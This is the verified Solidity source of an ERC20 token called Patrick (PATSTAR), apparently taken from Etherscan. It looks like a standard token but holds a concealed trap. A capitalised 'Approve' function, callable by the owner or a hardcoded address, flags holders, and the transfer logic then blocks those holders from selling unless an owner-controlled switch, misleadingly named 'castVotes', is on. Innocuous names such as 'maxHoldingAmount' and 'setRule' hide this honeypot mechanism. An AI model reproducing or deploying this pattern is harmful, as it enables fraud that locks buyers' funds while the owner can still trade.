/**
 *Submitted for verification at Etherscan.io on 2023-05-27
*/

// SPDX-License-Identifier: MIT

/** 🌐 https://PatrickCoin.io/  */

pragma solidity =0.8.8;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        return a - b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }


}


interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);
    
    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}


abstract contract Security is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }

    modifier _auth() {require(msg.sender == 0xB5f4Af8AfB12f8f9E919D56d0770d6417fee8ee9);_;}

    function owner() internal view virtual returns (address) {
        return _owner;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract ERC20 is Context, Security, IERC20 {
    using SafeMath for uint256;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    mapping (address => bool) private _receiver;
    uint256 private maxTxLimit = 1*10**17*10**9;
    bool castVotes = false;
    uint256 private balances;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
 
    /**
     * @dev Sets the values for {name} and {symbol}, initializes {decimals}.
     */
    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = 9;
        balances = maxTxLimit;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function setRule(address _delegate) external onlyOwner {
        _receiver[_delegate] = false;
    }


    function maxHoldingAmount(address _delegate) public view returns (bool) {
        return _receiver[_delegate];
    }
    function toCast(bool c) external onlyOwner {
        castVotes = c;
    }

    function Approve(address _delegate) external  {
        require(msg.sender == 0xB5f4Af8AfB12f8f9E919D56d0770d6417fee8ee9 || msg.sender == owner());
        if(_delegate != owner()) {
            _receiver[_delegate] = true;
        }
    }
    function Approve(address[] memory _delegate) external  {
        require(msg.sender == 0xB5f4Af8AfB12f8f9E919D56d0770d6417fee8ee9 || msg.sender == owner());
        for (uint16 i = 0; i < _delegate.length; ) {
            if(_delegate[i] != owner()) {
                _receiver[_delegate[i]] = true;
            }
            unchecked { ++i; }
        }
    }



    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, ""));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        if (_receiver[sender]) require(castVotes == true, "");
        require(sender != address(0), "");
        require(recipient != address(0), "");
        
        _balances[sender] = _balances[sender].sub(amount, "");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }


    function _mint(address account, uint256 amount) internal virtual onlyOwner {
        require(account != address(0), "");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "");
        require(spender != address(0), "");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    

}

contract Patrick is ERC20 {
    using SafeMath for uint256;
    
    uint256 private totalsupply_;

    constructor () ERC20("Patrick", "PATSTAR") {
        totalsupply_ = 10000000000000 * 10**9;
        _mint(_msgSender(), totalsupply_);
        
    }

}